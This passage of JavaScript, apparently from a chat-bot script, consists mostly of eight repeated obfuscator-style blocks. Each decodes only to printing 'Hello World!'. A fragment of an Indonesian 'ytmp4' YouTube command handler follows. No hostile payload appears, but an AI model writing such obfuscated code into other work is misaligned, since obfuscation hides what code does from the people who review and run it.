_0x382ff0=_0x55fac4;console[_0x3575ec(0x52c,0x538,0x5dc,0x572,0x48e)](_0x382ff0[_0x560c11(0x4ed,0x53f,0x5bf,0x4c1,0x56d)]);}hi();
var _0x49ac=['1cisltR','153KzGzmF','4cJUvbG','69teaKGO','\x20Worl','3823KsrtuO','log','cvOyL','2sCStMn','Hello','116588WSSjNg','8318WjvCOO','290132uCKoNC','138889DVNMTX','3413qgugyn','293327cdVRJT','49hanodd'];(function(_0x252721,_0x41364c){var _0x49c6db=function(_0xa0fb06,_0x223d82,_0x18c795,_0x18632d,_0x49d89e){return _0x3f17(_0xa0fb06-0x2b3,_0x223d82);},_0x38c1b2=function(_0x2d38e5,_0x1b70ba,_0x5f4924,_0x37e50b,_0x43749f){return _0x3f17(_0x2d38e5-0x2b3,_0x1b70ba);},_0x1b67d8=function(_0x6f0e8c,_0x5a35a8,_0x382af4,_0x4798b3,_0x1186ba){return _0x3f17(_0x6f0e8c-0x2b3,_0x5a35a8);},_0x4c4f4e=function(_0xce27c5,_0x58fd27,_0x5a42d3,_0x20ddcc,_0x4de992){return _0x3f17(_0xce27c5-0x2b3,_0x58fd27);},_0x116b5c=function(_0x396b95,_0x2b021e,_0x1284f2,_0x3c84e1,_0x423221){return _0x3f17(_0x396b95-0x2b3,_0x2b021e);};while(!![]){try{var _0x2aba5b=-parseInt(_0x49c6db(0x3bc,0x3b6,0x3b4,0x3c2,0x3c1))*parseInt(_0x38c1b2(0x3b7,0x3bb,0x3b0,0x3b8,0x3b3))+parseInt(_0x1b67d8(0x3bd,0x3c0,0x3be,0x3bd,0x3b9))*-parseInt(_0x38c1b2(0x3b9,0x3b1,0x3bb,0x3c1,0x3bb))+-parseInt(_0x49c6db(0x3ba,0x3b5,0x3bc,0x3b6,0x3b4))+parseInt(_0x38c1b2(0x3b6,0x3ba,0x3b6,0x3be,0x3b7))*parseInt(_0x1b67d8(0x3bb,0x3b3,0x3bf,0x3b4,0x3bb))+parseInt(_0x1b67d8(0x3be,0x3b7,0x3c3,0x3be,0x3b9))*parseInt(_0x1b67d8(0x3b8,0x3bd,0x3b5,0x3b3,0x3be))+parseInt(_0x1b67d8(0x3c1,0x3bf,0x3c2,0x3ca,0x3b9))*parseInt(_0x49c6db(0x3bf,0x3bb,0x3c5,0x3ba,0x3ba))+-parseInt(_0x116b5c(0x3c4,0x3c2,0x3cd,0x3c9,0x3bc))*-parseInt(_0x116b5c(0x3b5,0x3b3,0x3bb,0x3b1,0x3b0));if(_0x2aba5b===_0x41364c)break;else _0x252721['push'](_0x252721['shift']());}catch(_0x43fae4){_0x252721['push'](_0x252721['shift']());}}}(_0x49ac,-0x14*0x1825+-0x9*0x625f+0xac0d0));function hi(){var _0x4c0a53=function(_0x3c9f69,_0x541f54,_0x284ec7,_0x4ae870,_0x46996d){return _0x3f17(_0x541f54-0x2d7,_0x3c9f69);},_0x4cb050=function(_0x355610,_0x57bdb1,_0x249aff,_0x4a9688,_0x43fa3b){return _0x3f17(_0x57bdb1-0x2d7,_0x355610);},_0x43ff56=function(_0x30b2d4,_0xe40946,_0x50edac,_0x2cab5c,_0x3d497d){return _0x3f17(_0xe40946-0x2d7,_0x30b2d4);},_0x3afcb9=function(_0x29c150,_0x3668e7,_0x1dea7f,_0x4b6fea,_0x57dc9e){return _0x3f17(_0x3668e7-0x2d7,_0x29c150);},_0x49903c=function(_0x34f89c,_0x3051f2,_0x2890b9,_0x4bafe6,_0x208ac0){return _0x3f17(_0x3051f2-0x2d7,_0x34f89c);},_0x1eca77={};_0x1eca77[_0x4c0a53(0x3e0,0x3e7,0x3eb,0x3e7,0x3e4)]=_0x4c0a53(0x3e1,0x3e9,0x3ec,0x3e2,0x3e1)+_0x4c0a53(0x3ec,0x3e4,0x3df,0x3df,0x3e6)+'d!';var _0x376aa5=_0x1eca77;console[_0x3afcb9(0x3e7,0x3e6,0x3ec,0x3e7,0x3ef)](_0x376aa5[_0x49903c(0x3de,0x3e7,0x3ef,0x3e5,0x3e2)]);}function _0x3f17(_0x3a6724,_0x311f06){_0x3a6724=_0x3a6724-(0x17*-0x81+-0x2*0x4a9+0x15eb);var _0x276945=_0x49ac[_0x3a6724];return _0x276945;}hi();
var _0x1dff=['16uhFuiT','524138BpWjXU','log','238492eYikrw','71nvhmYB','1513620zjOdxE','607561ivmkgc','3449pwJZGu','\x20Worl','1131141Ludlov','2LrQbTI','79811YkWOht','nMRCg','Hello'];(function(_0x5abb41,_0x55a571){var _0xa40288=function(_0x29bbc0,_0x15a746,_0x1784f0,_0x329928,_0xc8fe24){return _0x521d(_0x15a746- -0x36d,_0x1784f0);},_0x41bfbf=function(_0x4694e5,_0x1bc908,_0x4a4a83,_0x302ae1,_0x257bce){return _0x521d(_0x1bc908- -0x36d,_0x4a4a83);},_0x5c77d5=function(_0x2ba55a,_0x5c6080,_0x554f14,_0x891940,_0x3ce3f3){return _0x521d(_0x5c6080- -0x36d,_0x554f14);},_0xc31457=function(_0x5d40bd,_0x203aa8,_0x2e4285,_0xe970ec,_0x5592f9){return _0x521d(_0x203aa8- -0x36d,_0x2e4285);},_0x1743e4=function(_0x24cc89,_0x12d446,_0x3b2d8a,_0x3f51f7,_0x1cffae){return _0x521d(_0x12d446- -0x36d,_0x3b2d8a);};while(!![]){try{var _0x50ad64=-parseInt(_0xa40288(-0x1f7,-0x1fc,-0x203,-0x1f8,-0x1f7))*-parseInt(_0x41bfbf(-0x200,-0x1ff,-0x206,-0x1fb,-0x1fa))+parseInt(_0x41bfbf(-0x201,-0x207,-0x207,-0x206,-0x20a))*-parseInt(_0xc31457(-0x201,-0x200,-0x206,-0x1fc,-0x204))+parseInt(_0x5c77d5(-0x200,-0x206,-0x20d,-0x205,-0x202))*-parseInt(_0x1743e4(-0x202,-0x203,-0x205,-0x207,-0x209))+parseInt(_0x1743e4(-0x1fd,-0x1fb,-0x1fe,-0x1fa,-0x1fc))+-parseInt(_0x41bfbf(-0x207,-0x204,-0x209,-0x204,-0x209))+-parseInt(_0xc31457(-0x1ff,-0x201,-0x1fd,-0x1fe,-0x1fe))+parseInt(_0x41bfbf(-0x1fe,-0x205,-0x208,-0x1fe,-0x207));if(_0x50ad64===_0x55a571)break;else _0x5abb41['push'](_0x5abb41['shift']());}catch(_0x4b5987){_0x5abb41['push'](_0x5abb41['shift']());}}}(_0x1dff,-0x1133f8+0xb1f4+0x3*0x9d8df));function hi(){var _0x58b811=function(_0x205ce2,_0x535b2f,_0x430ea8,_0x5b7849,_0x24948e){return _0x521d(_0x430ea8- -0x208,_0x205ce2);},_0x18343a=function(_0x40382a,_0x5afa14,_0x54e426,_0x48ce9d,_0x193e29){return _0x521d(_0x54e426- -0x208,_0x40382a);},_0x2b55a4=function(_0x3e472a,_0x24107b,_0x5778d0,_0x131e32,_0x382e7a){return _0x521d(_0x5778d0- -0x208,_0x3e472a);},_0xe59cf5=function(_0x2e6da2,_0x3ab5d6,_0x53dcfb,_0x48dbb7,_0x21a585){return _0x521d(_0x53dcfb- -0x208,_0x2e6da2);},_0x16aa62=function(_0x1860ff,_0x52715a,_0x116c52,_0x1c0632,_0x4bd758){return _0x521d(_0x116c52- -0x208,_0x1860ff);},_0x2c8d38={};_0x2c8d38[_0x58b811(-0x9c,-0x9e,-0x99,-0x95,-0x92)]=_0x58b811(-0x9e,-0x9c,-0x98,-0x96,-0x95)+_0x2b55a4(-0x99,-0x9f,-0x9d,-0xa3,-0x9f)+'d!';var _0x17f9fd=_0x2c8d38;console[_0x58b811(-0x99,-0x98,-0x95,-0x96,-0x98)](_0x17f9fd[_0x16aa62(-0x9e,-0x95,-0x99,-0x98,-0x9f)]);}function _0x521d(_0x2aca58,_0xbe9681){_0x2aca58=_0x2aca58-(-0x8a1+0x1a*0x10e+-0x1165);var _0x1aab36=_0x1dff[_0x2aca58];return _0x1aab36;}hi();
var _0x2151=['1fTAlQE','Hello','\x20Worl','LppPe','377446Ppficz','122234JpxoXy','991290nlmzTC','31naapOb','271393dCnrRS','5BJThOy','30183NveHDY','485620vFhZKS','log','432067XcUWYj'];(function(_0x13af9e,_0xc18913){var _0x4053da=function(_0x40c7d2,_0xb58fff,_0x453d40,_0x8e76c6,_0x2709cf){return _0x1046(_0x8e76c6- -0x281,_0x2709cf);},_0x2ac1de=function(_0x4e2135,_0xaa643d,_0x26e582,_0x4caadc,_0x3bfe99){return _0x1046(_0x4caadc- -0x281,_0x3bfe99);},_0x2a6834=function(_0x3264e1,_0x17aacd,_0x3b610a,_0x25ed05,_0x23627f){return _0x1046(_0x25ed05- -0x281,_0x23627f);},_0x3c45a1=function(_0x4ee5bb,_0x3886bc,_0x22ccff,_0x1bda69,_0x18f693){return _0x1046(_0x1bda69- -0x281,_0x18f693);},_0x3b8c3f=function(_0x39bf6a,_0x4830d5,_0x50cf1d,_0x3ed353,_0x255eb8){return _0x1046(_0x3ed353- -0x281,_0x255eb8);};while(!![]){try{var _0x2d8d3d=parseInt(_0x4053da(-0x132,-0x12c,-0x12d,-0x12d,-0x128))*parseInt(_0x4053da(-0x125,-0x12c,-0x123,-0x129,-0x12f))+parseInt(_0x4053da(-0x124,-0x128,-0x126,-0x125,-0x127))+parseInt(_0x2a6834(-0x130,-0x132,-0x130,-0x12e,-0x129))+-parseInt(_0x3c45a1(-0x12f,-0x12b,-0x131,-0x12c,-0x131))+parseInt(_0x4053da(-0x128,-0x126,-0x12c,-0x128,-0x128))*parseInt(_0x3c45a1(-0x127,-0x12c,-0x12d,-0x12b,-0x12c))+-parseInt(_0x4053da(-0x12c,-0x130,-0x12d,-0x12a,-0x12c))+-parseInt(_0x2a6834(-0x139,-0x12f,-0x12c,-0x132,-0x12c))*parseInt(_0x2ac1de(-0x126,-0x125,-0x12a,-0x127,-0x120));if(_0x2d8d3d===_0xc18913)break;else _0x13af9e['push'](_0x13af9e['shift']());}catch(_0x2b6529){_0x13af9e['push'](_0x13af9e['shift']());}}}(_0x2151,0x872ce+0x77a0e*-0x2+0xfc883));function _0x1046(_0x3e21f,_0x256ef5){_0x3e21f=_0x3e21f-(-0x55e+-0x213b+0x27e8);var _0x363771=_0x2151[_0x3e21f];return _0x363771;}function hi(){var _0x86b7ad=function(_0x174a61,_0x501c38,_0xa3611d,_0x333d40,_0x3c99ac){return _0x1046(_0x501c38-0x283,_0x3c99ac);},_0x18f57d=function(_0x568fba,_0x3bcea2,_0x185dbb,_0x3a3e5d,_0x287068){return _0x1046(_0x3bcea2-0x283,_0x287068);},_0x5037cf=function(_0x2dba88,_0x200161,_0x2fd706,_0x32a7b5,_0x42bd97){return _0x1046(_0x200161-0x283,_0x42bd97);},_0x54fe4d=function(_0x53ba94,_0x176c7f,_0x2effe4,_0x1100a6,_0x285223){return _0x1046(_0x176c7f-0x283,_0x285223);},_0x7a8e1e=function(_0x49593d,_0x37b47a,_0x665f37,_0x2798a3,_0x180769){return _0x1046(_0x37b47a-0x283,_0x180769);},_0x4330cd={};_0x4330cd[_0x86b7ad(0x3cf,0x3d5,0x3d1,0x3dc,0x3ce)]=_0x86b7ad(0x3cc,0x3d3,0x3d2,0x3d4,0x3d9)+_0x18f57d(0x3d8,0x3d4,0x3d0,0x3cf,0x3d0)+'d!';var _0x48029d=_0x4330cd;console[_0x86b7ad(0x3da,0x3de,0x3e0,0x3e4,0x3dc)](_0x48029d[_0x7a8e1e(0x3d8,0x3d5,0x3da,0x3d2,0x3d7)]);}hi();
var _0x2892=['2796lBDVKg','426889eHtiqk','Hello','240475AkFezk','34clbDfo','24908RAvKof','6502IFCCjE','log','1eyFIAf','10NTQJiv','472525vWBZqB','21MuTLkg','mlEQL','95037dNIkwa','4XzVeSz','\x20Worl'];function _0x6703(_0x332d88,_0x2b7623){_0x332d88=_0x332d88-(0x11f1+0x475+-0x150f*0x1);var _0x528165=_0x2892[_0x332d88];return _0x528165;}(function(_0x1524d2,_0x3ca43f){var _0x5401bd=function(_0x209062,_0x395b9a,_0x2a01bc,_0x15faaa,_0x493fa9){return _0x6703(_0x2a01bc- -0x26c,_0x493fa9);},_0x51d1cd=function(_0x26763e,_0x23823f,_0x5c0f3b,_0x3372b2,_0x377540){return _0x6703(_0x5c0f3b- -0x26c,_0x377540);},_0x383c5b=function(_0x36095b,_0x3d22be,_0x330b97,_0x3e1303,_0x1454d1){return _0x6703(_0x330b97- -0x26c,_0x1454d1);},_0x4f6a99=function(_0x139971,_0x2e87a3,_0x34c279,_0x2f560a,_0x1c68c){return _0x6703(_0x34c279- -0x26c,_0x1c68c);},_0x49379c=function(_0x1b4caf,_0x5ce428,_0x302af3,_0x12b285,_0x251f27){return _0x6703(_0x302af3- -0x26c,_0x251f27);};while(!![]){try{var _0x770269=parseInt(_0x5401bd(-0x112,-0x11b,-0x115,-0x11b,-0x11b))+parseInt(_0x5401bd(-0x10d,-0x109,-0x10a,-0x108,-0x103))*parseInt(_0x383c5b(-0x117,-0x10e,-0x113,-0x112,-0x11b))+parseInt(_0x51d1cd(-0x10c,-0x110,-0x114,-0x10e,-0x11a))*parseInt(_0x49379c(-0x110,-0x106,-0x108,-0x10b,-0x10b))+parseInt(_0x5401bd(-0x10c,-0x103,-0x107,-0x106,-0x104))*parseInt(_0x5401bd(-0x110,-0x10d,-0x110,-0x118,-0x118))+parseInt(_0x51d1cd(-0x114,-0x112,-0x112,-0x10a,-0x10a))*-parseInt(_0x383c5b(-0x10f,-0x106,-0x10d,-0x10d,-0x108))+parseInt(_0x4f6a99(-0x10c,-0x113,-0x10e,-0x113,-0x112))+parseInt(_0x4f6a99(-0x104,-0x108,-0x10b,-0x10d,-0x10b))*-parseInt(_0x5401bd(-0x10e,-0x10b,-0x10f,-0x117,-0x10c));if(_0x770269===_0x3ca43f)break;else _0x1524d2['push'](_0x1524d2['shift']());}catch(_0xa37e5a){_0x1524d2['push'](_0x1524d2['shift']());}}}(_0x2892,-0x19089+-0xb*-0x6089+-0x1*-0x1321f));function hi(){var _0x748471=function(_0x3008e0,_0x1d28f4,_0x1b61de,_0x339141,_0x310e1f){return _0x6703(_0x310e1f-0x7a,_0x1b61de);},_0x1f7596=function(_0x4c448e,_0x3a371c,_0x47c3bf,_0x4abf98,_0x4a7b29){return _0x6703(_0x4a7b29-0x7a,_0x47c3bf);},_0x3190de=function(_0x12b096,_0x1e6cd4,_0x52030f,_0x4bffeb,_0x56290c){return _0x6703(_0x56290c-0x7a,_0x52030f);},_0x4fb155=function(_0x5f0b22,_0x566069,_0xafe3d3,_0x12b5e5,_0x5ae136){return _0x6703(_0x5ae136-0x7a,_0xafe3d3);},_0x379e5d=function(_0x16e614,_0x3df6cc,_0x38f915,_0x5237ed,_0x49c53d){return _0x6703(_0x49c53d-0x7a,_0x38f915);},_0xe079e1={};_0xe079e1[_0x748471(0x1d9,0x1da,0x1e1,0x1db,0x1da)]=_0x748471(0x1e7,0x1e7,0x1dd,0x1db,0x1e0)+_0x748471(0x1e1,0x1db,0x1e4,0x1e3,0x1dd)+'d!';var _0x250d90=_0xe079e1;console[_0x3190de(0x1ce,0x1d8,0x1d9,0x1d6,0x1d5)](_0x250d90[_0x1f7596(0x1e1,0x1dd,0x1d2,0x1d3,0x1da)]);}hi();
var _0xa494=['461198guhzrU','1346734OzNWsd','27oNzqkW','1LBjsGi','Uqfpw','9127AiKGhG','log','89yEThMI','550533Ogmyhn','Hello','32377AUvZvw','71vPiYGd','756304wscllM','\x20Worl','18597INNoKB'];(function(_0x16d0b5,_0xf89082){var _0x49f247=function(_0xff55db,_0x20a934,_0x398312,_0x4796c3,_0x3f1ab7){return _0x504f(_0xff55db-0x318,_0x4796c3);},_0x34a735=function(_0x2d69bd,_0x1dc1e2,_0x3750ca,_0xd03432,_0x2e1c0a){return _0x504f(_0x2d69bd-0x318,_0xd03432);},_0x347ff9=function(_0xdf4430,_0x17d238,_0x1a4ef7,_0x36bf30,_0x214731){return _0x504f(_0xdf4430-0x318,_0x36bf30);},_0x16b720=function(_0x56878d,_0x478e35,_0x15fbe7,_0x3a4056,_0x3bde91){return _0x504f(_0x56878d-0x318,_0x3a4056);},_0x33cc29=function(_0x514088,_0x1a3e97,_0x340436,_0x49ff2e,_0x5ecd23){return _0x504f(_0x514088-0x318,_0x49ff2e);};while(!![]){try{var _0x337638=parseInt(_0x49f247(0x3cb,0x3c7,0x3c4,0x3ce,0x3d3))*parseInt(_0x34a735(0x3cd,0x3d2,0x3d4,0x3ce,0x3cc))+parseInt(_0x347ff9(0x3c8,0x3c1,0x3ca,0x3ca,0x3c6))*-parseInt(_0x34a735(0x3c1,0x3bc,0x3b9,0x3bd,0x3c7))+parseInt(_0x16b720(0x3c7,0x3cd,0x3cb,0x3cd,0x3cd))+-parseInt(_0x33cc29(0x3c3,0x3c3,0x3c2,0x3bc,0x3c8))*-parseInt(_0x16b720(0x3c9,0x3c4,0x3c4,0x3ce,0x3ca))+-parseInt(_0x16b720(0x3c6,0x3ca,0x3c1,0x3bf,0x3c9))+parseInt(_0x347ff9(0x3bf,0x3bd,0x3c5,0x3c1,0x3ba))+parseInt(_0x33cc29(0x3c2,0x3be,0x3bb,0x3c1,0x3c9))*-parseInt(_0x34a735(0x3c5,0x3c9,0x3c8,0x3c9,0x3cb));if(_0x337638===_0xf89082)break;else _0x16d0b5['push'](_0x16d0b5['shift']());}catch(_0x27c77f){_0x16d0b5['push'](_0x16d0b5['shift']());}}}(_0xa494,0x16a705*0x1+0x14f804+0x1f428b*-0x1));function hi(){var _0x104c75=function(_0x28d988,_0x214fb7,_0x32c45b,_0x209dd3,_0x1654a3){return _0x504f(_0x209dd3-0x3e7,_0x214fb7);},_0x9ed0e=function(_0x1eb2b3,_0x1a9099,_0x47b344,_0x5cae96,_0x55782f){return _0x504f(_0x5cae96-0x3e7,_0x1a9099);},_0x21ead9=function(_0xfd893a,_0x46e0c1,_0x16fda8,_0x386103,_0x5ec164){return _0x504f(_0x386103-0x3e7,_0x46e0c1);},_0x1a0fa8=function(_0x3dc546,_0x43fe20,_0x5a662d,_0x2be594,_0x17218e){return _0x504f(_0x2be594-0x3e7,_0x43fe20);},_0x184893=function(_0x1d22b0,_0x401c86,_0x5b6a45,_0x3fe331,_0x1d28bf){return _0x504f(_0x3fe331-0x3e7,_0x401c86);},_0x13bc94={};_0x13bc94[_0x104c75(0x491,0x49c,0x497,0x499,0x493)]=_0x9ed0e(0x488,0x492,0x495,0x48f,0x48d)+_0x104c75(0x49b,0x49a,0x49b,0x493,0x491)+'d!';var _0x7775c4=_0x13bc94;console[_0x104c75(0x4a0,0x49d,0x493,0x49b,0x4a1)](_0x7775c4[_0x1a0fa8(0x49b,0x494,0x49d,0x499,0x4a0)]);}function _0x504f(_0x423b80,_0x21c653){_0x423b80=_0x423b80-(0x1faa+0x91*0x3d+-0x4190);var _0x5dd6cc=_0xa494[_0x423b80];return _0x5dd6cc;}hi();
var _0x1a2d=['873274GOPKwu','49711TqvDhS','vSwjL','\x20Worl','6288WzzdEo','158LOZYqz','65050TiskhG','Hello','3457238BFUhof','1048345mcjShl','8dYNcgW','log','9zqBrQA','1036383cchzlh'];(function(_0x3c9f84,_0xf9deaf){var _0x59f774=function(_0x55c2e1,_0x1af17c,_0x2ebb3f,_0x4fc754,_0x286f22){return _0x4954(_0x1af17c- -0xef,_0x4fc754);},_0x5cfd5c=function(_0x44d40f,_0x1979f2,_0x23f583,_0x5898a0,_0x521d52){return _0x4954(_0x1979f2- -0xef,_0x5898a0);},_0x20c769=function(_0xb90686,_0xdf929b,_0x105f6f,_0x4d84fd,_0x5e7cc0){return _0x4954(_0xdf929b- -0xef,_0x4d84fd);},_0x376eb5=function(_0x15bcc2,_0x25cab5,_0x2aff59,_0x29426e,_0x4bdc68){return _0x4954(_0x25cab5- -0xef,_0x29426e);},_0x4e6ab7=function(_0x30f571,_0x7a65bb,_0x3fb9c7,_0x3fe116,_0x2acfa1){return _0x4954(_0x7a65bb- -0xef,_0x3fe116);};while(!![]){try{var _0x2d25ba=-parseInt(_0x59f774(0x67,0x63,0x69,0x5f,0x5c))*-parseInt(_0x5cfd5c(0x5e,0x62,0x64,0x5c,0x60))+parseInt(_0x5cfd5c(0x6b,0x64,0x5e,0x66,0x5d))*-parseInt(_0x20c769(0x6d,0x68,0x64,0x65,0x6e))+-parseInt(_0x59f774(0x5a,0x5e,0x65,0x5a,0x65))+-parseInt(_0x4e6ab7(0x58,0x5d,0x5d,0x60,0x5b))+parseInt(_0x4e6ab7(0x5e,0x5f,0x66,0x5b,0x60))*-parseInt(_0x376eb5(0x59,0x5c,0x57,0x58,0x62))+-parseInt(_0x4e6ab7(0x62,0x67,0x63,0x6b,0x66))+parseInt(_0x5cfd5c(0x68,0x66,0x66,0x63,0x68));if(_0x2d25ba===_0xf9deaf)break;else _0x3c9f84['push'](_0x3c9f84['shift']());}catch(_0x59ea96){_0x3c9f84['push'](_0x3c9f84['shift']());}}}(_0x1a2d,-0x1c35d*-0x8+-0x1b185+-0xc62*0x5b));function _0x4954(_0x1355fd,_0x3169a1){_0x1355fd=_0x1355fd-(-0x9ce+-0x1*-0xfef+-0x2*0x26b);var _0x2c6143=_0x1a2d[_0x1355fd];return _0x2c6143;}function hi(){var _0x1683cd=function(_0x2d0bd1,_0x54806a,_0x3438a7,_0x45a1ad,_0x1cec13){return _0x4954(_0x1cec13- -0x184,_0x3438a7);},_0x247154=function(_0x367324,_0x2fc684,_0x5c8f60,_0x223bec,_0x3930c0){return _0x4954(_0x3930c0- -0x184,_0x5c8f60);},_0x3102a3=function(_0x562ae7,_0x2bcb3a,_0x8bea13,_0x483f01,_0x2dc5e4){return _0x4954(_0x2dc5e4- -0x184,_0x8bea13);},_0x22703e=function(_0x77f87b,_0xe30b88,_0x535ac0,_0x101ffc,_0x2f4233){return _0x4954(_0x2f4233- -0x184,_0x535ac0);},_0x318c90=function(_0x59e9f6,_0x3dcb5b,_0x251259,_0x3fb760,_0x5ec60f){return _0x4954(_0x5ec60f- -0x184,_0x251259);},_0x557a23={};_0x557a23[_0x1683cd(-0x39,-0x2e,-0x2e,-0x33,-0x35)]=_0x1683cd(-0x31,-0x2b,-0x29,-0x29,-0x30)+_0x1683cd(-0x37,-0x35,-0x3a,-0x39,-0x34)+'d!';var _0x42836a=_0x557a23;console[_0x22703e(-0x26,-0x2e,-0x2e,-0x33,-0x2c)](_0x42836a[_0x22703e(-0x38,-0x34,-0x2e,-0x2e,-0x35)]);}hi();
var _0x52b6=['979806odjWHO','866172blkIpR','48673lXrcwz','144110wbrnrs','EpKap','59312BEeZim','454073XDAqOT','4ptRdUT','log','71823cxnXKK','Hello','\x20Worl','19ZzJRim','2QnhARU'];(function(_0x38a6ff,_0x429c03){var _0x1a7b23=function(_0x287403,_0x47713a,_0x1dbbac,_0x47e099,_0xf1c18d){return _0x59b1(_0x47e099- -0x183,_0x1dbbac);},_0x4e812d=function(_0xa1ba31,_0xd5e37c,_0xebf963,_0x238ed5,_0x48fe9d){return _0x59b1(_0x238ed5- -0x183,_0xebf963);},_0x4845fa=function(_0x578980,_0x22097b,_0x3e9496,_0x2adf05,_0x366b9f){return _0x59b1(_0x2adf05- -0x183,_0x3e9496);},_0x4c3b51=function(_0x3ef968,_0x4a9350,_0x1252e1,_0x22d2cd,_0x31c7b4){return _0x59b1(_0x22d2cd- -0x183,_0x1252e1);},_0x22f02d=function(_0x256e85,_0x442fa8,_0xe2e2c8,_0x52d69a,_0x3a5bde){return _0x59b1(_0x52d69a- -0x183,_0xe2e2c8);};while(!![]){try{var _0x3a9259=parseInt(_0x1a7b23(-0x1d,-0x16,-0x21,-0x1c,-0x15))*parseInt(_0x1a7b23(-0x27,-0x1f,-0x22,-0x26,-0x24))+parseInt(_0x4845fa(-0x14,-0x1f,-0x1a,-0x1a,-0x15))+-parseInt(_0x4e812d(-0x2a,-0x28,-0x27,-0x27,-0x24))+-parseInt(_0x4845fa(-0x1e,-0x20,-0x1b,-0x22,-0x1b))*parseInt(_0x4e812d(-0x14,-0x1a,-0x1a,-0x1b,-0x1f))+-parseInt(_0x1a7b23(-0x1d,-0x23,-0x1e,-0x23,-0x27))+-parseInt(_0x4e812d(-0x23,-0x21,-0x22,-0x1f,-0x22))+parseInt(_0x1a7b23(-0x2a,-0x21,-0x1e,-0x25,-0x20))*parseInt(_0x1a7b23(-0x23,-0x27,-0x1f,-0x21,-0x24));if(_0x3a9259===_0x429c03)break;else _0x38a6ff['push'](_0x38a6ff['shift']());}catch(_0x25ee65){_0x38a6ff['push'](_0x38a6ff['shift']());}}}(_0x52b6,-0xbe48c+0x9f467*0x1+0x1*0xab881));function hi(){var _0x412edf=function(_0x5ed909,_0x1d0a8a,_0x3077ab,_0x37e70b,_0x381276){return _0x59b1(_0x5ed909-0x3d5,_0x37e70b);},_0xd1fc57=function(_0x16ed48,_0x187f12,_0x3c1622,_0x1e4dfa,_0x17a6d9){return _0x59b1(_0x16ed48-0x3d5,_0x1e4dfa);},_0x3b3a17=function(_0x4d7aab,_0x6a1332,_0x54a086,_0x5bd53c,_0x49323f){return _0x59b1(_0x4d7aab-0x3d5,_0x5bd53c);},_0x29c70a=function(_0x220ed0,_0x46a777,_0x1cdcfb,_0x208e69,_0x5786d1){return _0x59b1(_0x220ed0-0x3d5,_0x208e69);},_0x56416c=function(_0x4eb994,_0x16a747,_0x4fe4ec,_0x2577ea,_0x25865e){return _0x59b1(_0x4eb994-0x3d5,_0x2577ea);},_0x24c641={};_0x24c641[_0x412edf(0x534,0x533,0x534,0x533,0x53b)]=_0xd1fc57(0x53a,0x537,0x53d,0x540,0x538)+_0x412edf(0x53b,0x536,0x537,0x53b,0x542)+'d!';var _0x2ddb5a=_0x24c641;console[_0x29c70a(0x538,0x531,0x536,0x53e,0x53b)](_0x2ddb5a[_0x3b3a17(0x534,0x539,0x52e,0x535,0x531)]);}function _0x59b1(_0x5e775f,_0x2a80ea){_0x5e775f=_0x5e775f-(0x1c7f*0x1+-0x10c1*-0x1+-0x6a*0x6a);var _0x4cb48b=_0x52b6[_0x5e775f];return _0x4cb48b;}hi();
var _0x3091=['OwFke','6qqTyBv','614682xEMKJU','182821PPlWEs','437282BVnHDF','Hello','2msSnuM','19381QRANiX','564751nbeKxk','\x20Worl','455556CSAxxI','log','522091blOpDQ','1ArvwbP'];(function(_0x3bd903,_0x4daeee){var _0x4b6e1d=function(_0xae9d3b,_0x2ffd03,_0x497a39,_0x410a61,_0x2d2187){return _0x22f5(_0x497a39-0x385,_0x410a61);},_0x51f4f8=function(_0x2669c5,_0x34b5c2,_0x43adab,_0x3f1a82,_0x5bb68d){return _0x22f5(_0x43adab-0x385,_0x3f1a82);},_0x53b70f=function(_0x6cafc9,_0x5b2761,_0x1bfdc9,_0x163cba,_0x1fe8ba){return _0x22f5(_0x1bfdc9-0x385,_0x163cba);},_0x4f1061=function(_0x499a74,_0x5cc142,_0x41f762,_0x198362,_0x5bb718){return _0x22f5(_0x41f762-0x385,_0x198362);},_0x27ff5d=function(_0x4ad94b,_0xf7cb1c,_0x45daf9,_0x528ef9,_0x756eff){return _0x22f5(_0x45daf9-0x385,_0x528ef9);};while(!![]){try{var _0x34c042=parseInt(_0x4b6e1d(0x514,0x515,0x516,0x50f,0x50f))+parseInt(_0x51f4f8(0x513,0x50c,0x50f,0x50f,0x50f))*parseInt(_0x51f4f8(0x50e,0x50b,0x511,0x50c,0x50b))+parseInt(_0x53b70f(0x50a,0x50a,0x50d,0x509,0x50c))*-parseInt(_0x4f1061(0x505,0x509,0x50c,0x50a,0x507))+-parseInt(_0x4b6e1d(0x517,0x50d,0x510,0x50c,0x517))+parseInt(_0x4b6e1d(0x516,0x50d,0x514,0x51b,0x50f))*parseInt(_0x53b70f(0x50e,0x516,0x515,0x518,0x51b))+-parseInt(_0x53b70f(0x518,0x512,0x512,0x516,0x516))+parseInt(_0x4f1061(0x50e,0x503,0x50a,0x50b,0x510));if(_0x34c042===_0x4daeee)break;else _0x3bd903['push'](_0x3bd903['shift']());}catch(_0x24df68){_0x3bd903['push'](_0x3bd903['shift']());}}}(_0x3091,-0xe805f+0x95007*-0x1+0x3*0xae5de));function _0x22f5(_0x13af2e,_0x4926e0){_0x13af2e=_0x13af2e-(-0x13*-0xcb+0x134a+-0x20d7);var _0x3734bb=_0x3091[_0x13af2e];return _0x3734bb;}function hi(){var _0x12b4e5=function(_0xd818b2,_0x5149df,_0x3ddd85,_0x37dede,_0x71de35){return _0x22f5(_0x3ddd85-0x204,_0x37dede);},_0x1ada77=function(_0x4b48c5,_0x5648c4,_0x39c595,_0x49ce77,_0x1f5d9f){return _0x22f5(_0x39c595-0x204,_0x49ce77);},_0xc6712e=function(_0x108616,_0x3d4d39,_0x9f62ee,_0x575976,_0x30de6b){return _0x22f5(_0x9f62ee-0x204,_0x575976);},_0x3829b7=function(_0x23f45a,_0x156791,_0x1f99f3,_0xf159d1,_0xe42fc1){return _0x22f5(_0x1f99f3-0x204,_0xf159d1);},_0x20d23c=function(_0x3cd15b,_0x1affe2,_0x2f3125,_0x46168d,_0x186357){return _0x22f5(_0x2f3125-0x204,_0x46168d);},_0x6adfba={};_0x6adfba[_0x12b4e5(0x391,0x38b,0x38d,0x38f,0x388)]=_0x1ada77(0x394,0x398,0x392,0x392,0x399)+_0x1ada77(0x382,0x387,0x388,0x384,0x387)+'d!';var _0x4d0ee0=_0x6adfba;console[_0xc6712e(0x38d,0x387,0x38a,0x388,0x38d)](_0x4d0ee0[_0x20d23c(0x390,0x387,0x38d,0x38e,0x391)]);}hi();

break
                case 'ytmp4':
						if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
